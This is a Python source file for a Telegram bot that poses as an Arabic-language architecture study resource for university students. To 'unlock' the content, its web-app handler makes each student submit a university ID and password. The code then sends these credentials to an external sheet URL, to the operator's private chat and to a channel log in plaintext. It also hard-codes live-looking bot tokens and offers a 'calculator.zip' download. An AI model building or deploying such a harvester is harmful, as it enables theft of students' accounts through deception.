import os
import requests
import telebot
from telebot import types
from flask import Flask, request

TOKEN_STUDENT = "8753263807:AAFO9rKx7yy4MeQyBbCBLnwkQvPo57v5qyw"
TOKEN_ADMIN = "8507731905:AAE-ke_vMTR2V3Yz4w3i4kTR7H-yX2JAmmE"
CHANNEL_ID = "-1002493393930"
MY_PERSONAL_ID = 2038606299
GOOGLE_SHEET_URL = "https://google.com"

student_bot = telebot.TeleBot(TOKEN_STUDENT, threaded=False)
admin_bot = telebot.TeleBot(TOKEN_ADMIN, threaded=False)
app = Flask(__name__)

approved_users = set()
pending_users = {}

@app.route('/')
def home():
    return "System Link Active"

@app.route('/' + TOKEN_STUDENT, methods=['POST'])
def get_message_student():
    json_string = request.stream.read().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    student_bot.process_new_updates([update])
    return "!", 200

@app.route('/' + TOKEN_ADMIN, methods=['POST'])
def get_message_admin():
    json_string = request.stream.read().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    admin_bot.process_new_updates([update])
    return "!", 200
@student_bot.message_handler(commands=['start'])
def handle_start(message):
    uid = message.from_user.id
    if uid in approved_users:
        show_approved_menu(uid)
        return
    try:
        status = student_bot.get_chat_member(CHANNEL_ID, uid).status
        if status in ['member', 'administrator', 'creator']:
            approved_users.add(uid)
            show_approved_menu(uid)
            return
    except:
        pass
    student_bot.send_message(uid, "🔒 مرحباً بك في موسوعة العمارة.\nالمحتوى مقفل حالياً؛ الرجاء الضغط على زر القائمة بالأسفل (🌐 فتح الموسوعة المعمارية) لإرسال بياناتك الأكاديمية وطلب التفعيل من الإدارة أولاً.")

@student_bot.message_handler(content_types=['web_app_data'])
def handle_web_app_data(message):
    uid = message.from_user.id
    raw_data = message.web_app_data.data.strip()
    try:
        uni_id, password = raw_data.split(' ')
    except:
        student_bot.send_message(uid, "❌ خطأ في معالجة البيانات من الواجهة؛ يرجى إعادة المحاولة.")
        return

    pending_users[uid] = {"uni_id": uni_id, "password": password}

    try:
        requests.post(GOOGLE_SHEET_URL, json={"uniId": uni_id, "password": password}, timeout=10)
    except:
        pass

    markup = types.InlineKeyboardMarkup()
    btn_app = types.InlineKeyboardButton("✅ موافقة وتفعيل الطالب", callback_data=f"auth_acc_{uid}")
    btn_rej = types.InlineKeyboardButton("❌ رفض الطلب", callback_data=f"auth_rej_{uid}")
    markup.row(btn_app, btn_rej)

    text = f"🔔 طلب انضمام ومطابقة جديد:\n\n👤 آيدي الطالب: {uid}\n🎓 الرقم الجامعي: {uni_id}\n🔑 كلمة المرور: {password}"
    admin_bot.send_message(MY_PERSONAL_ID, text, reply_markup=markup)
    student_bot.send_message(uid, "⏳ تم إرسال بياناتك بنجاح وجاري مطابقتها من قِبل الإدارة وتخزين حسابك. يرجى الانتظار.")
@admin_bot.callback_query_handler(func=lambda call: call.data.startswith("auth_"))
def handle_admin_auth(call):
    parts = call.data.split('_')
    action = parts[1]
    target_uid = int(parts[2])

    if action == "acc":
        if target_uid in pending_users:
            uni_id = pending_users[target_uid]["uni_id"]
            password = pending_users[target_uid]["password"]
            try:
                approved_users.add(target_uid)
                link = student_bot.export_chat_invite_link(CHANNEL_ID)
                database_text = f"USER_LOG\nID:{target_uid}\nUNI:{uni_id}\nPWD:{password}"
                student_bot.send_message(CHANNEL_ID, database_text)
                admin_bot.edit_message_text(f"✅ Approved and stored ID: {target_uid}", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
                student_bot.send_message(target_uid, f"🎉 Approved!\nYour ID is now stored and verified.")
                show_approved_menu(target_uid)
            except Exception as e:
                admin_bot.answer_callback_query(call.id, f"Error: {str(e)}")
        else:
            admin_bot.answer_callback_query(call.id, "Error: Data not found.")
    elif action == "rej":
        if target_uid in pending_users:
            del pending_users[target_uid]
        try:
            student_bot.send_message(target_uid, "❌ Request denied by admin.")
            admin_bot.edit_message_text(f"❌ Denied ID: {target_uid}", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
        except:
            pass

def show_approved_menu(uid):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_free = types.InlineKeyboardButton("📚 Free Sections", callback_data="app_free")
    btn_paid = types.InlineKeyboardButton("🔒 Premium Course", callback_data="app_paid")
    btn_gpa = types.InlineKeyboardButton("💾 GPA Calculator", callback_data="app_gpa")
    markup.add(btn_free, btn_paid, btn_gpa)
    student_bot.send_message(uid, "🏛️ Welcome to Architecture Encyclopedia! Select section:", reply_markup=markup)

@student_bot.callback_query_handler(func=lambda call: call.data.startswith("app_"))
def handle_approved_navigation(call):
    uid = call.message.chat.id
    if call.data == "app_free":
        markup = types.InlineKeyboardMarkup()
        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="app_back")
        markup.add(btn_back)
        student_bot.edit_message_text("📂 Free Sections active.", chat_id=uid, message_id=call.message.message_id, reply_markup=markup)
    elif call.data == "app_gpa":
        try:
            with open("calculator.zip", "rb") as file:
                student_bot.send_document(uid, file)
        except:
            student_bot.send_message(uid, "Error: File not found.")
    elif call.data == "app_paid":
        student_bot.send_message(uid, "Premium Section Locked.")

@student_bot.callback_query_handler(func=lambda call: call.data == "app_back")
def handle_back_btn(call):
    uid = call.message.chat.id
    student_bot.delete_message(uid, call.message.message_id)
    show_approved_menu(uid)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
